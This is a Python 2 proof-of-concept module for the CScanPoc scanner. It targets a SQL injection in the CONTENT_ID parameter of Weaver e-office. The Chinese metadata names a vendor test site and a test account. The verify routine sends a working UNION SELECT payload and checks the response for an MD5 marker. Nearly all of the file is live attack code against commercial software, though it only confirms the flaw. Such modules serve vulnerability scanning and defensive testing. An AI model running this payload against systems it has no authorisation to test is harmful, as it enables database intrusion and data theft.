# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'weaver_0052_L' # 平台漏洞编号，留空
    name = '泛微e-office SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-10-11'  # 漏洞公布时间
    desc = '''
        测试官方站点，首先用使用测试账户xj登录，然后访问下面的地址。
        http://eoffice8.weaver.cn:8028/general/file_folder/file_new/neworedit/index.php?FILE_SORT=&CONTENT_ID=123&SORT_ID=166&func_id=&operationType=editFromRead&docStr=

        其中的CONTENT_ID参数能够注射SQL语句。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/797/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = '泛微e-office'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c33c5003-95af-493c-9196-bf19420b22d1'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #根据实际环境payload可能不同
            #另外需要登录账户测试
            payload = '/general/file_folder/file_new/neworedit/index.php'
            data = "?FILE_SORT=&CONTENT_ID=-4%20union%20select%201,2,3,4,5,md5(c),7,8,9,10,11,12,13,14,15,16,17,18,19%23&SORT_ID=166&func_id=&operationType=editFromRead&docStr="
            url = self.target + payload + data
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
